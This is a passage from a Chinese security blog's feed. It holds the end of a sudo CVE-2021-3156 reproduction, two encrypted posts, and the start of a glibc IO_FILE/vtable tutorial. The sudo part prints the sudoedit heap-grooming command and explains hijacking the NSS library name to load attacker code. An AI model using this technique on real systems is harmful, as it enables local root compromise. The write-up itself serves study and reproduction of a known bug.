<code>_nl_global_locale.__names</code>，此时里面包含 <code>;x=x</code>的形式的值，但不会被检测到</li><li><code>saved_LC_ALL = setlocale(LC_ALL,NULL)</code>，返回 LC_ALL的值，其中包含了 <code>;x=x</code>的形式的值</li><li><code>setlocale(LC_ALL,&quot;C&quot;)</code>，将 <code>_nl_global_locale.__names</code>中存储的堆区的字符串指针都释放了，值都变成了 <code>_nl_C_name</code>的地址</li><li><code>setlocal(LC_ALL, saved_LC_ALL)</code>，由于 <code>saved_LC_ALL</code>中存在 <code>;x=x</code>导致直接返回，因此未修改 <code>_nl_global_locale.__names</code></li><li>再次执行 <code>saved_LC_ALL = setlocale(LC_ALL, NULL)</code>，<code>saved_LC_ALL=&quot;C&quot;</code>，因此之后 <code>LC_ALL</code>的值都会是 <code>C</code>，因为后面不会再执行 <code>setlocale(LC_ALL, &quot;&quot;)</code></li></ol><h2 id="2-堆布局"><a href="#2-堆布局" class="headerlink" title="2. 堆布局"></a>2. 堆布局</h2><p>通过上述分析，我们已经了解到了一些基础知识，接下来就是将需要利用的 <code>service_user</code>堆块放到 <code>user_args</code>堆块后，且让两者之间相隔较近。这就是<code>exp</code>中最精妙的堆布局部分。</p><p>首先进入 <code>sudo.c</code>就会执行 <code>setlocale(LC_ALL,&quot;&quot;)</code>，根据上面分析，这里是会从环境变量中获取值，从而分别申请堆块，申请堆块大小与环境变量中各个值有关。申请完成后，可以在 <code>_nl_global_locale.__names</code>中查看。</p><p>随后执行 <code>setlocale(LC_ALL,NULL)</code>，会申请一个新的堆块，用于存储当前 <code>_nl_global_locale.__names</code>中的值。堆块的大小，如果 <code>_nl_global_locale.__names</code>中的值相同，则申请一个堆块，存储一次即可；如果不相同，则需要申请大堆块将不同的值都存储进去。</p><p>然后执行 <code>setlocale(LC_ALL,&quot;C&quot;)</code>，会释放当前 <code>_nl_global_locale.__names</code>中的堆块，总共释放11个堆块，然后将 <code>_nl_global_locale.__names</code>中的值指向全局变量 <code>C</code>.</p><p>然后执行 <code>setlocale(LC_ALL,saved_LC_ALL)</code>，将保存的值又重新赋给 <code>_nl_global_locale.__names</code>。这里是否需要重新申请堆块，以及更新 <code>_nl_global_locale.__names</code>中的值，需要按照上述分析的要求。</p><p>再次执行 <code>setlocale(LC_ALL，NULL)</code>，获取当前的值。最后，再次释放当前 <code>_nl_global_locale.__names</code>中的堆块</p><p><strong>malloc(user_args)</strong></p><p>当我们分配 <code>user_args</code>是，总体的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env -i LC_ALL&#x3D;C.UTF-8@+&quot;C&quot;*212 sudoedit -s 56*&#39;A&#39;+&#39;\&#39; &#39;\&#39; 54*&#39;B&#39;+&#39;\&#39;</span><br></pre></td></tr></table></figure><p><code>NewArgv[1] = 56‘A’+’\’</code>，总长度为58。<br><code>NewArgv[2] = ‘\’</code>，总长度为2。<br><code>NewArgv[3] = 54‘B’+’\’</code>，总长度为56。<br><code>user_args</code>需要的长度就是58+2+56=0x74。</p><p>所以会申请 <code>0x80</code>的堆块，而我们之前 有一块 <code>0x80</code>的堆块位于 <code>tcache</code>中，且位于 <code>group systemd</code>堆块的上方。所以这里正好将这个 <code>0x80</code>的堆块分配出来。随后利用堆溢出覆盖 <code>group systemd</code>堆块。</p><h1 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h1><p>通过堆溢出劫持堆上的struct service_user结构体中的library指针为NULL以通过一些检查。 接着覆写service_user中的name变量为”X/X”，这样做的目的在于，当函数正常执行时，会做如下的文件路径拼接：”libnss” + name + “.so.2”，正常情况下是：libnss_systemd.so.2，而当我们劫持了name后就变成了：”libnss_X/P0P_SH3LLZ_.so.2”，然后使用___libc_dlopen进行加载。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;第一次来复现&lt;/p&gt;
&lt;h1 id=&quot;0x01-介绍&quot;&gt;&lt;a href=&quot;#0x01-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 介绍&quot;&gt;&lt;/a&gt;0x01 介绍&lt;/h1&gt;&lt;p&gt;2021年01月26日，sudo发布安全通告，修复了一个类Unix操作系</summary>
      
    
    
    
    
    <category term="CVE复现" scheme="https://pz1o.top/tags/CVE%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>vmpwn</title>
    <link href="https://pz1o.top/2021/03/29/vmpwn/"/>
    <id>https://pz1o.top/2021/03/29/vmpwn/</id>
    <published>2021-03-29T10:03:03.000Z</published>
    <updated>2021-04-18T15:09:07.026Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>My RUST</title>
    <link href="https://pz1o.top/2021/03/25/My-RUST/"/>
    <id>https://pz1o.top/2021/03/25/My-RUST/</id>
    <published>2021-03-25T10:03:51.000Z</published>
    <updated>2021-04-01T09:32:00.592Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="RUST" scheme="https://pz1o.top/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>IO_FILE</title>
    <link href="https://pz1o.top/2021/03/25/IO-FILE/"/>
    <id>https://pz1o.top/2021/03/25/IO-FILE/</id>
    <published>2021-03-25T10:02:53.000Z</published>
    <updated>2021-04-14T09:21:19.857Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-FILE结构"><a href="#0x01-FILE结构" class="headerlink" title="0x01 FILE结构"></a>0x01 FILE结构</h1><h2 id="1-FILE-介绍"><a href="#1-FILE-介绍" class="headerlink" title="1.FILE 介绍"></a>1.FILE 介绍</h2><p>FILE 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。 FILE 结构在程序执行 fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 FILE 结构的指针来接收这个返回值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don't get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>正常的链表如图所示，通常由IO_list_all是链表头部，之后是用chain链连起来</p><p><img src="/2021/03/25/IO-FILE/20210218150610948.png" alt="在这里插入图片描述"></p><p>在标准 I/O 库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。<strong>因此在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于 libc.so 的数据段。而我们使用 fopen 创建的文件流是分配在堆内存上的。</strong></p><blockquote><p>_IO_FILE 结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针 vtable 指向了一系列函数指针。</p><p>在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&gt;&#123;</span></span><br><span class="line">   _IO_FILE    file;</span><br><span class="line">   IO_jump_t   *vtable;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p><code>vtable</code>（虚表）：是<code>IO_jump_t</code> 类型的指针，<code>IO_jump_t</code>中保存了一些函数指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">void</span> * funcs[] = &#123;</span><br><span class="line">  <span class="number">1</span> <span class="literal">NULL</span>, <span class="comment">// "extra word"</span></span><br><span class="line">  <span class="number">2</span> <span class="literal">NULL</span>, <span class="comment">// DUMMY</span></span><br><span class="line">  <span class="number">3</span> <span class="built_in">exit</span>, <span class="comment">// finish</span></span><br><span class="line">  <span class="number">4</span> <span class="literal">NULL</span>, <span class="comment">// overflow</span></span><br><span class="line">  <span class="number">5</span> <span class="literal">NULL</span>, <span class="comment">// underflow</span></span><br><span class="line">  <span class="number">6</span> <span class="literal">NULL</span>, <span class="comment">// uflow</span></span><br><span class="line">  <span class="number">7</span> <span class="literal">NULL</span>, <span class="comment">// pbackfail</span></span><br><span class="line">  </span><br><span class="line">  <span class="number">8</span> <span class="literal">NULL</span>, <span class="comment">// xsputn  #printf</span></span><br><span class="line">  <span class="number">9</span> <span class="literal">NULL</span>, <span class="comment">// xsgetn</span></span><br><span class="line">  <span class="number">10</span> <span class="literal">NULL</span>, <span class="comment">// seekoff</span></span><br><span class="line">  <span class="number">11</span> <span class="literal">NULL</span>, <span class="comment">// seekpos</span></span><br><span class="line">  <span class="number">12</span> <span class="literal">NULL</span>, <span class="comment">// setbuf</span></span><br><span class="line">  <span class="number">13</span> <span class="literal">NULL</span>, <span class="comment">// sync</span></span><br><span class="line">  <span class="number">14</span> <span class="literal">NULL</span>, <span class="comment">// doallocate</span></span><br><span class="line">  <span class="number">15</span> <span class="literal">NULL</span>, <span class="comment">// read</span></span><br><span class="line">  <span class="number">16</span> <span class="literal">NULL</span>, <span class="comment">// write</span></span><br><span class="line">  <span class="number">17</span> <span class="literal">NULL</span>, <span class="comment">// seek</span></span><br><span class="line">  <span class="number">18</span> pwn,  <span class="comment">// close</span></span><br><span class="line">  <span class="number">19</span> <span class="literal">NULL</span>, <span class="comment">// stat</span></span><br><span class="line">  <span class="number">20</span> <span class="literal">NULL</span>, <span class="comment">// showmanyc</span></span><br><span class="line">  <span class="number">21</span> <span class="literal">NULL</span>, <span class="comment">// imbue</span></span><br><span class="line">&gt;&#125;;</span><br></pre></td></tr></table></figure></blockquote><h2 id="2-fread"><a href="#2-fread" class="headerlink" 